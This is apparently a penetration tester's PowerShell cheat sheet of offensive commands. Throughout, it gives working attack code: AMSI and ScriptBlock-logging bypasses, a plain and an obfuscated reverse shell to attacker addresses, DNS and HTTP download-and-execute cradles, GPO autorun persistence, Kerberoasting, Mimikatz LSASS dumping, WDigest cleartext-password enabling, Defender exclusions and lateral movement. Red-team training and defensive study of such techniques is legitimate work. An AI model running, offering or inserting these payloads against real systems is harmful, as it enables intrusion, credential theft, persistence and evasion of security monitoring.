- Get ACLs of object (such as files and directories)
	- `Get-Acl -Path C:\\ | Format-List`
- Mount remote share
	- `New-PSDrive -name cthulhufhtagn -PSProvider "FileSystem" -Root "\\<attackerip>\cthulhufhtagn"`
- Searching directories recursively for cleartext credentials in files (GPP passwords for example)
	- `pushd \\example.com\sysvol`
	- `gci * -Include *.xml -Recurse -EA SilentlyContinue | select-string cpassword`
	- `popd`
- Find services with unquoted paths
	- `Get-CIMInstance -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name`
- Download and execute payload without IEX or Invoke-WebRequest (a few options)
	- `powershell . (nslookup -q=txt attacker.domain.com )[-1]`
	- `powershell . (Resolve-DnsName attacker.domain.com -Type txt).Strings`
- AMSI Bypass
	```Powershell
	$Kernel32 = Add-Type -MemberDefinition $MethodDefinition -Name 'Kernel32' -NameSpace 'Win32' -PassThru;
	$ABSD = 'AmsiS'+'canBuffer';
	$handle = [Win32.Kernel32]::GetModuleHandle('amsi.dll');
	[IntPtr]$BufferAddress = [Win32.Kernel32]::GetProcAddress($handle, $ABSD);
	```
	```Powershell
	[Ref].Assembly.GetType('System.Management.Automation.'+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBtAHMAaQBVAHQAaQBsAHMA')))).GetField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YQBtAHMAaQBJAG4AaQB0AEYAYQBpAGwAZQBkAA=='))),'NonPublic,Static').SetValue($null,$true)
	```
	```Powershell 
	[Ref].Assembly.GetType('System.Management.Automation.'+$("41 6D 73 69 55 74 69 6C 73".Split(" ")|forEach{[char]([convert]::toint16($_,16))}|forEach{$result=$result+$_};$result)).GetField($("61 6D 73 69 49 6E 69 74 46 61 69 6C 65 64".Split(" ")|forEach{[char]([convert]::toint16($_,16))}|forEach{$result2=$result2+$_};$result2),'NonPublic,Static').SetValue($null,$true)
	```

- Search for filenames
	- `gci -Recurse -Force -Path C:\Users -Include "flag" -ErrorAction SilentlyContinue`

- Reverse shell one-liner
```PowerShell
$cthulhu = New-Object System.Net.Sockets.TCPClient('10.10.14.30',8443);$tntcl = $cthulhu.GetStream();[byte[]]$cult = 0..65535|%{0};while(($i = $tntcl.Read($cult, 0, $cult.Length)) -ne 0){;$d = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($cult,0, $i);$ex = (iex $d 2>&1 | Out-String );$ex2  = $ex + 'CF ' + (pwd).Path + '> ';$shog = ([text.encoding]::ASCII).GetBytes($ex2);$tntcl.Write($shog,0,$shog.Length);$tntcl.Flush()};
```

- DNS cradle
```PowerShell
$m= (-Join (Resolve-DnsName -Type txt pwn.domain.com).Strings);
IEX (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($m))))
```

- Base64 the above:
	- `iconv -f ASCII -t UTF-16LE powershellrev.txt | base64 | tr -d "\n"`

- Oneliner to send:
	- `powershell -enc <encoded shell>`

- Obfuscated reverse shell - Must use with Socat encrypted shell listed in "Web Resources" section
```PowerShell
$gnlSlSXDZ = & ([string]::join('', ( ($(0+0-0-0-0-78+78+78),$(101+101+0-0-0-0-0+0-101),($(119)),$(0+0-0-0-0+45),$($(79)),$(((98))),($(106)),$(101+101+0-0-0-0-0+0-101),$(99+99+0-99),$($(116))) |ForEach-Object{$_<##>}|%{ ( [char][int] $_<#ZdQB8miMexFGoshJ4qKRp1#>)})) |ForEach-Object{<##>$($_)}| % {<#HWEG3yFVCbNOvfYute5#>$_<#o#>}) ([string]::join('', ( ($(83+83+0+0+0-0-83),$(((121))),((115)),$($(116)),$(101+101+0-0-0-0-0+0-101),(($(109))),(46),$(0+0-0-0-0-78+78+78),$(101+101+0-0-0-0-0+0-101),$($(116)),(46),$(83+83+0+0+0-0-83),$(0+0+0+0+111),$(99+99+0-99),(107),$(101+101+0-0-0-0-0+0-101),$($(116)),((115)),(46),(84),($(67)),$(80),($(67)),$(0-0+0-108+108+108),$(0+105),$(101+101+0-0-0-0-0+0-101),(110),$($(116))) |ForEach-Object{$($_)<##>}|%{ ( [char][int] <##>$($_)<##>)})) |ForEach-Object{<#FLut3kIYDMAyO9a2hEH0zQJ4w#>$_<#WI8r#>}| % {<#OjUEN8nkxf#>$($_)})("J5q0aMgvL.xAeq3T8MEcL6sRaXUrOZ.SHUZv12CgW0es7xPkJmtFo.CbYjgiDaIe7GWdPs".replace('CbYjgiDaIe7GWdPs',DDDDDDDD).replace('SHUZv12CgW0es7xPkJmtFo',CCCCCCCC).replace('J5q0aMgvL',AAAAAAAA).replace('xAeq3T8MEcL6sRaXUrOZ',BBBBBBBB),$(EEEEEEEE));$fU4QP = $gnlSlSXDZ.GetStream();$h1okj42 = New-Object System.Net.Security.SslStream($fU4QP,$false,({$True} -as [Net.Security.RemoteCertificateValidationCallback]));$h1okj42.AuthenticateAsClient('FFFFFFFF', $null, "Tls12", $false);$nf1083fj = new-object System.IO.StreamWriter($h1okj42);$nf1083fj.Write('PS ' + (pwd).Path + '> ');$nf1083fj.flush();[byte[]]$h8r109 = 0..65535|%{0};while(($nf839nf = $h1okj42.Read($h8r109, 0, $h8r109.Length)) -ne 0){$nr81of = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($h8r109,0, $nf839nf);$ngrog49 = (iex $nr81of | Out-String ) 2>&1;$nir1048 = $ngrog49 + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($nir1048);$h1okj42.Write($sendbyte,0,$sendbyte.Length);$h1okj42.Flush()};
	```
		 - AAAAAAAA == 1st octet of LHOST
		 - BBBBBBBB == 2nd octet of LHOST
		 - CCCCCCCC == 3rd octet of LHOST
		 - DDDDDDDD == 4th octet of LHOST
		 - EEEEEEEE == LPORT
		 - FFFFFFFF == Domain to auth as (doesn't really matter, use something that looks like theirs)
- Check for CLM
	- `$ExecutionContext.SessionState.LanguageMode`
- Get NETBIOS Domain Name
	- `powerpick (gwmi Win32_NTDomain).DomainName`
- Runas
	- `$user = 'MINION\Administrator';`
	- `$password = '1234test';`
	- `$secpass = ConvertTo-SecureString $password -AsPlainText -Force;`
	- `$credential = New-Object System.Management.Automation.PSCredential $user, $secpass;`
	- `Invoke-Command -Computername localhost -Credential $credential -ScriptBlock { cd C:\Users\Administrator\Desktop; C:\Users\Administrator\Desktop\root.exe }`
	- Similar:
```PowerShell
$pw = ConvertTo-SecureString -AsPlainText -Force -String "Admin1234!"
$cred = New-Object -typename System.Management.Automation.PSCredential -argumentlist "contoso\Administrator",$pw
$session = New-PSSession -ComputerName dc01 -Credential $cred
Invoke-Command -Session $session -ScriptBlock {hostname}
Enter-PSSession -Session $session
```


- Give current user DCSync rights
	- `Add-DomainObjectAcl -Rights DCSync`
- Convert command to encoded string:
	- `$str = "IEX ((new-object net.webclient).downloadstring('http://10.8.0.6:80/http-beacon'))"`
	- `[System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($str))`
- Encode a payload:
```PowerShell
if ($args.count -ne 1) { Write-Host "Too many args" }
else {
"String to encode: " + $Args[0]
"Encoded: "
$str = $Args[0]
$encoded = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($str))
write-host $encoded
}
```
- Group Policy
	- Create a new, empty GPO
		- `New-GPO`
	- Link a GPO to a site, domain, or OU
		- `New-GPLink`
	- Configures a Registry preference item under either HKCU or HKLM
		- `Set-GPPrefRegistryValue`
	- Configure registry-based policy settings under HKCU or HKLM
		- `Set-GPRegistryValue`
	- Generate GPO report in XML or HTML
		- `Get-GPOReport`
	- Example exploitation:
		- Create a new GPO and link to an OU over which you have permissions
			- `New-GPO -Name 'Cthulhu GPO' | New-GPLink -Target 'OU=3268,OU=Workstations,DC=cyberbotic,DC=io'`
		- Write an autorun Registry key to machines in that OU
			- `Set-GPPrefRegistryValue -Name 'Cthulhu GPO' -Context Computer -Action Create -Key 'HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run' -ValueName 'Updater' -Value 'powershell -w 1 -c "iex (new-object net.webclient).downloadstring(''http://10.8.0.6/HTTPGrunt.ps1'')"' -Type ExpandString`
- Targetted Kerberoast (possible if we have GenericAll permissions on a user)
	- `Set-DomainObject -Identity jadams -Set @{serviceprincipalname="fake/NOTHING"}`
	- `Get-DomainUser -Identity jadams -Properties ServicePrincipalName`
	- `execute-assembly C:\Tools\Rubeus\Rubeus\bin\Debug\Rubeus.exe kerberoast /user:jadams /nowrap`
- Targetted ASREPRoasting
	- `Get-DomainUser -Identity jadams | ConvertFrom-UACValue`
	- `Set-DomainObject -Identity jadams -XOR @{UserAccountControl=4194304}`
	- `Get-DomainUser -Identity jadams | ConvertFrom-UACValue`
	- `execute-assembly C:\Tools\Rubeus\Rubeus\bin\Debug\Rubeus.exe asreproast /user:jadams /nowrap`
	- `powershell Set-DomainObject -Identity jadams -XOR @{UserAccountControl=4194304}`
	- `powershell Get-DomainUser -Identity jadams | ConvertFrom-UACValue`
- Read LAPS admin password
	- `Get-DomainObject -Identity wkstn-2 -Properties ms-Mcs-AdmPwd`
- Enumerate exclusions
	- `Get-MpPreference | select Exclusion*`
	- `Parse-PolFile .\Registry.pol`
- Add exclusion
	- `Set-MpPreference -ExclusionPath "<path>"`
- Find Shares
	- `Find-DomainShare [-CheckShareAccess]`
- Ping an IP range
	- `1..254 | %{echo "10.0.2.$_"; ping -n 1 10.0.2.$_ | Select-String ttl}`
- Port Scan an IP
	- `1..1024 | %{echo ((New-Object Net.Sockets.TcpClient).Connect("10.0.2.8", $_)) "Open port on - $_"} 2>$null`
- LOL Kerberoast
	- Single SPN: `Add-Type -AssemblyName System.IdentityModel; New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "<SPN>"`
- Mimikatz in memory w/ LSASS Injection
	- `Invoke-Mimikatz -Command '"privilege::debug" "LSADump::LSA /inject"' -Computer dc03.prod.local`
- Turn on WDigest to force storing of cleartext passwords in LSASS
	- `Set-ItemProperty -Force -Path 'HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' -Name "UseLogonCredential" -Value '1'`
- Copy proxy settings from valid user for SYSTEM download cradle
	```PowerShell
	New-PSDrive -Name HKU -PSProvider Registry -Root HKEY_USERS | Out-Null
	$keys = Get-ChildItem 'HKU:\'
	ForEach ($key in $keys) {if ($key.Name -like "*S-1-5-21-*") {$start = 
	$key.Name.substring(10);break}}
	$proxyAddr=(Get-ItemProperty -Path 
	"HKU:$start\Software\Microsoft\Windows\CurrentVersion\Internet Settings\").ProxyServer[system.net.webrequest]::DefaultWebProxy = new-object 
	System.Net.WebProxy("http://$proxyAddr")
	$wc = new-object system.net.WebClient
	$wc.DownloadString("http://192.168.119.120/run2.ps1")
	```

- Dynamic DNS
	- `Invoke-DNSUpdate -DNSType A -DNSName test -DNSData 192.168.100.100 -Verbose` 

- Lateral Movement
	- DCOM
		- `$([activator]::CreateInstance([type]::GetTypeFromCLSID("C08AFD90-F2A1-11D1-8455-00A0C91F3880","acmedc.acme.int"))).Navigate("c:\windows\system32\calc.exe")`
		- `$([activator]::CreateInstance([type]::GetTypeFromCLSID("C08AFD90-F2A1-11D1-8455-00A0C91F3880","acmedc.acme.int"))).Navigate2("c:\windows\system32\calc.exe")`
		- `$a=[System.Activator]::CreateInstance([type]::GetTypeFromProgID('MMC20.Application.1','127.0.0.1'));$a.Document.ActiveView.ExecuteShellCommand('cmd',$null,'/c echo Cthulhu fhtagn! > C:\hi.txt','7')`

- Enable RestrictedAdmin
	- `New-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Lsa" -Name DisableRestrictedAdmin -Value 0`

- Enumerate forest trusts
	- `([System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()).GetAllTrustRel ationships()`

- Enumerate Read-Only Domain Controllers (RODCs) with passwords currently cached.
	- `(Get-AdComputer -Identity RODC -Properties 'msDS-RevealedList').'msDS-RevealedList'`
	- Accounts like "krbtgt_12345" are related to the RODC (meant to be compromised) and are therefore useless

- Retrieve cached credentials from RODC
	- `net ads search -k -S ad.local '(samaccountname=RODC$)' managedBy`
		- Find principals with local admin on RODC
	- `secretsdump.py <local admin>@rodc.ad.local -use-vss`
		- The NTDS will contain all users, but non-cached ones will have a null password shown by the hash "31d6cfe0d16ae931b73c59d7e0c089c0"

- Enumerate a user for a fine-grained password policy
	- `(Get-AdUser -Identity <username> -Properties 'msDS-ResultantPso'). 'msDS-ResultantPso'`
		- An empty reply means that the default domain-wide policy is used
		- If non-empty...
	- `(Get-AdObject -SearchBase 'CN=Password Settings Container, CN=System, DC=ad, DC=local' -LdapFilter 'CN=<CN-from-above>' -Properties *).'msDS-MinimumPasswordLength'`

- Enumerate Service Connection Points (SCPs) - hosted services in the environment
	- `(Get-AdObject -LdapFilter '(serviceBindingInformation=*)' -Properties *).serviceBindingInformation`

- Enumerate implicit SPNs
	- `(Get-Adobject -SearchBase 'CN=Windows NT, CN=Services, CN=Configuration, DC=ad, DC=local" - LdapFilter 'CN=Directory Service' - Properties *). SPNMappings`
		- "host=" signifies that when an object has at least one explicit HOST SPN set, it will also implicitly have all of the SPNs contained here

- LSASS as a protected process
	- Enumerate
		- `Get-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Control\Lsa -Name "RunAsPPL"`
	- Bypass
		- PPLDump
		- Nanodump

- Execute .NET assembly in memory without touching disk, using reflection:
	1. `$d = (New-Object http://System.Net.WebClient).DownloadData('http://<ip>/Rubeus.exe')`
	2. `$a = [System.Reflection.Assembly]::Load($d)`
	3. `[Rubeus.Program]::Main("triage".Split())`

- Target acquisition
	- Local DNS cache
		- `ipconfig /displaydns`
		- `Get-DNSClientCache`
	- Query network DNS server for entries
		- `Get-DnsRecord -RecordType A -ZoneName FQDN -Server <server hostname>`
			- Output to a file: `Get-DnsRecord -RecordType A -ZoneName FQDN -Server <server hostname> | % {Add-Content -Value $_ -Path records.txt}`
		- `Get-CimInstance -Namespace Root\MicrosoftDNS -Query "SELECT * FROM MicrosoftDNS_AType WHERE ContainerName='rlyeh.local'"`
	- mDNS
		- Sapito (see References/Repos)

- ScriptBlock logging bypass
```PowerShell
$GroupPolicySettingsField = [ref].Assembly.GetType('System.Management.Automation.Utils')."GetFie`ld"('cachedGroupPolicySettings', 'N'+'onPublic,Static')
$GroupPolicySettings = $GroupPolicySettingsField.GetValue($null)
$GroupPolicySettings['ScriptBlockLogging']['EnableScriptBlockLogging'] = 0
$GroupPolicySettings['ScriptBlockLogging']['EnableScriptBlockInvocationLogging'] = 0
iex (New-Object Net.WebClient).downloadstring("https://myserver/mypayload.ps1")
```